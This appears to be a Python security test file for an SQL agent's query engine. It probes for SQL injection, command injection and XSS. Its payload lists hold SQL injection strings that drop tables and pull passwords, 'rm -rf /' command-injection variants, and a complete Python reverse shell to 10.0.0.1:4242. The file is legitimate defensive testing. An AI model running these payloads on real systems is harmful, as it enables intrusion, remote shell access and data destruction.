"""
Security Tests for Query Engine

This module contains security tests for the SQL Agent's Query Engine,
focusing on SQL injection prevention, input validation, and access control.

RESPONSE_SEQUENCE {
  1. changelog_engine.update_changelog()
  2. execute_security_tests()
  3. validation_suite.run_validation()
  4. workspace_state_sync()
}
"""

import os
import sys
import json
import logging
from pathlib import Path
from typing import Dict, List, Any, Tuple, Optional

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Import required modules
from core.changelog_engine import ChangelogEngine
from query.query_engine import QueryEngine
from query.enhanced_query_engine import EnhancedQueryEngine
from testing.security_test_framework import (
    SecurityVulnerability, 
    SecurityTestResult,
    SecurityTestCase,
    SQLInjectionTestCase
)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("logs/query_engine_security_test.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class QueryEngineSecurityTest(SecurityTestCase):
    """
    Security tests for the Query Engine component
    """
    def setUp(self):
        """Set up security test with changelog update"""
        super().setUp()
        
        # Initialize the query engine
        self.query_engine = QueryEngine()
        self.enhanced_query_engine = EnhancedQueryEngine()
        
        # Define common SQL injection payloads
        self.sql_injection_payloads = [
            "'; DROP TABLE users; --",
            "1 OR 1=1",
            "1' OR '1'='1",
            "1; SELECT * FROM sensitive_data",
            "' UNION SELECT username, password FROM users --",
            "admin' --",
            "1' OR 1=1; DROP TABLE users; --",
            "' OR username LIKE '%admin%",
            "'; EXEC xp_cmdshell('dir'); --",
            "1' OR '1'='1' UNION SELECT null, table_name FROM information_schema.tables --"
        ]
        
        # Define common malicious inputs
        self.malicious_inputs = [
            "<script>alert('XSS')</script>",
            "$(rm -rf /)",
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "`rm -rf /`",
            "eval(compile('for x in range(1):\\n import sys\\n sys.exit()','','exec'))",
            "__import__('os').system('rm -rf /')",
            "os.system('rm -rf /')",
            "exec('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\'10.0.0.1\\',4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);')"
        ]
        
        # Define security vulnerabilities to test
        self.sql_injection_vulnerability = SecurityVulnerability(
            name="SQL Injection",
            description="SQL injection is a code injection technique that exploits a security vulnerability in an application's software",
            severity="High",
            test_payload="'; DROP TABLE users; --",
            mitigation="Use parameterized queries or prepared statements"
        )
        
        self.command_injection_vulnerability = SecurityVulnerability(
            name="Command Injection",
            description="Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system",
            severity="Critical",
            test_payload="$(rm -rf /)",
            mitigation="Validate and sanitize all user inputs, use allowlists for permitted commands"
        )
        
        self.xss_vulnerability = SecurityVulnerability(
            name="Cross-Site Scripting (XSS)",
            description="XSS attacks enable attackers to inject client-side scripts into web pages viewed by other users",
            severity="Medium",
            test_payload="<script>alert('XSS')</script>",
            mitigation="Sanitize and encode user input before rendering it"
        )
        
        logger.info("QueryEngineSecurityTest setup completed")
    
    def test_sql_injection_in_query_validation(self):
        """Test SQL injection prevention in query validation"""
        logger.info("Testing SQL injection prevention in query validation")
        
        results = []
        for payload in self.sql_injection_payloads:
            # Test if the query engine properly rejects SQL injection attempts
            def test_query_validation(payload):
                validation_result = self.query_engine.validate_query(payload)
                # If validation_result is False, the query was rejected (good)
                # If validation_result is True, the query was accepted (potential vulnerability)
                return not validation_result
            
            result = self.test_for_vulnerability(
                vulnerability=self.sql_injection_vulnerability,
                test_function=test_query_validation,
                payload=payload
            )
            results.append(result)
            
            if result.is_vulnerable:
                logger.warning(f"SQL injection vulnerability detected: {payload}")
            else:
                logger.info(f"SQL injection test passed for payload: {payload}")
        
        return results
    
    def test_command_injection_in_query_processing(self):
        """Test command injection prevention in query processing"""
        logger.info("Testing command injection prevention in query processing")
        
        results = []
        for payload in self.malicious_inputs:
            # Test if the query engine properly handles potentially malicious inputs
            def test_command_injection(payload):
                try:
                    # Attempt to process a query containing a command injection payload
                    query = f"SELECT * FROM users WHERE username = '{payload}'"
                    self.query_engine.process_query(query)
                    # If we get here without an exception, check if the payload was sanitized
                    # This is a simplified check - in a real test, we would need to verify
                    # that the command was not actually executed
                    return True
                except Exception as e:
                    # If an exception is raised, it might be because the engine detected
                    # and blocked the malicious input (good) or because of another error
                    if "security violation" in str(e).lower() or "invalid input" in str(e).lower():
                        # Engine detected and blocked the attack
                        return True
                    # Other exception - might indicate a vulnerability
                    return False
            
            result = self.test_for_vulnerability(
                vulnerability=self.command_injection_vulnerability,
                test_function=test_command_injection,
                payload=payload
            )
            results.append(result)
            
            if result.is_vulnerable:
                logger.warning(f"Command injection vulnerability detected: {payload}")
            else:
                logger.info(f"Command injection test passed for payload: {payload}")
        
        return results
    
    def test_xss_in_query_results(self):
        """Test XSS prevention in query results"""
        logger.info("Testing XSS prevention in query results")
        
        results = []
        for payload in self.malicious_inputs:
            # Test if the query engine properly sanitizes output that might contain XSS
            def test_xss_prevention(payload):
                try:
                    # Simulate a query that would return potentially malicious data
                    # In a real test, we would need to check if the output is properly sanitized
                    mock_query_result = f"SELECT '{payload}' AS result"
                    result = self.query_engine.process_query(mock_query_result)
                    
                    # Check if the result contains unsanitized XSS payload
                    # This is a simplified check - in a real test, we would need to verify
                    # that the output is properly sanitized
                    result_str = str(result)
                    if "<script>" in result_str and "</script>" in result_str:
                        # Potential XSS vulnerability
                        return False
                    return True
                except Exception as e:
                    # If an exception is raised, it might be because the engine detected
                    # and blocked the malicious input (good) or because of another error
                    if "security violation" in str(e).lower() or "invalid input" in str(e).lower():
                        # Engine detected and blocked the attack
                        return True
                    # Other exception - might indicate a vulnerability
                    return False
            
            result = self.test_for_vulnerability(
                vulnerability=self.xss_vulnerability,
                test_function=test_xss_prevention,
                payload=payload
            )
            results.append(result)
            
            if result.is_vulnerable:
                logger.warning(f"XSS vulnerability detected: {payload}")
            else:
                logger.info(f"XSS test passed for payload: {payload}")
        
        return results
    
    def test_all(self):
        """Run all security tests for the Query Engine"""
        logger.info("Running all Query Engine security tests")
        
        # Pre-Response: Changelog update execution
        changelog_engine = ChangelogEngine()
        changelog_engine.quick_update(
            action_summary="Running Query Engine security tests",
            changes=["Executing comprehensive security tests for the Query Engine component"],
            files=[("READ", "scripts/testing/test_query_engine_security.py", "Security test execution")]
        )
        
        # Execute security tests
        sql_injection_results = self.test_sql_injection_in_query_validation()
        command_injection_results = self.test_command_injection_in_query_processing()
        xss_results = self.test_xss_in_query_results()
        
        # Aggregate results
        all_results = sql_injection_results + command_injection_results + xss_results
        vulnerable_count = sum(1 for result in all_results if result.is_vulnerable)
        
        # Generate test summary
        test_summary = {
            "total_tests": len(all_results),
            "passed_tests": len(all_results) - vulnerable_count,
            "failed_tests": vulnerable_count,
            "pass_rate": round(((len(all_results) - vulnerable_count) / len(all_results)) * 100, 2) if all_results else 0,
            "vulnerabilities_detected": [
                {
                    "name": result.vulnerability.name,
                    "description": result.vulnerability.description,
                    "severity": result.vulnerability.severity,
                    "details": result.details,
                    "payload": result.vulnerability.test_payload,
                    "mitigation": result.vulnerability.mitigation
                }
                for result in all_results if result.is_vulnerable
            ]
        }
        
        # Save test results to file
        results_dir = Path("test_results/security")
        results_dir.mkdir(exist_ok=True, parents=True)
        results_file = results_dir / "query_engine_security_test_results.json"
        
        with open(results_file, "w") as f:
            json.dump(test_summary, f, indent=4)
        
        logger.info(f"Query Engine security test results saved to {results_file}")
        logger.info(f"Security tests completed with {test_summary['pass_rate']}% pass rate")
        
        # Post-Response: System validation
        changelog_engine.quick_update(
            action_summary="Completed Query Engine security tests",
            changes=[
                f"Security tests completed with {test_summary['pass_rate']}% pass rate",
                f"Detected {vulnerable_count} potential vulnerabilities"
            ],
            files=[
                ("MODIFY", "scripts/testing/test_query_engine_security.py", "Security test execution"),
                ("CREATE", str(results_file), "Security test results")
            ]
        )
        
        return test_summary

def run_security_tests():
    """Run all security tests for the Query Engine"""
    # Pre-Response: Changelog update execution
    changelog_engine = ChangelogEngine()
    changelog_engine.quick_update(
        action_summary="Initializing Query Engine security tests",
        changes=["Starting security test execution for Query Engine component"],
        files=[("READ", "scripts/testing/test_query_engine_security.py", "Security test initialization")]
    )
    
    # Execute security tests
    test_case = QueryEngineSecurityTest()
    test_case.setUp()
    test_summary = test_case.test_all()
    test_case.tearDown()
    
    # Post-Response: System validation
    changelog_engine.quick_update(
        action_summary="Completed Query Engine security test execution",
        changes=[
            f"Security tests completed with {test_summary['pass_rate']}% pass rate",
            f"Detected {test_summary['failed_tests']} potential vulnerabilities"
        ],
        files=[("READ", "scripts/testing/test_query_engine_security.py", "Security test completion")]
    )
    
    return test_summary

if __name__ == "__main__":
    run_security_tests()
